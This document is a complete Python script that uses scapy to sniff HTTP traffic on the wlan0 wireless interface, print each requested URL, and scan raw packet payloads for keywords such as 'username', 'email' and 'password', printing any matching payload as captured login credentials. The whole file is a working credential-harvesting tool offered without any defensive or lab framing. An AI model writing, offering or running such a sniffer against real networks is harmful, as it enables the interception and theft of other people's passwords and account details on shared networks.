#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_sniffer)

# function for getting the url or filtering links
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_logininfo(packet):
    if packet.haslayer(scapy.Raw):
        load = (packet[scapy.Raw].load)
        credentials = ["username", "email", "login", "user", "id", "password", "pass", "login-id", "employee-id"]
        for creds in credentials:
            if creds in load:
                return load


def packet_sniffer(packet):


    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]... analyzing the HTTP Request: " + url)
        login_key = get_logininfo(packet)
        if login_key:
            print("\n\n[+]The login credentials: " + login_key + "\n\n")

sniff("wlan0")
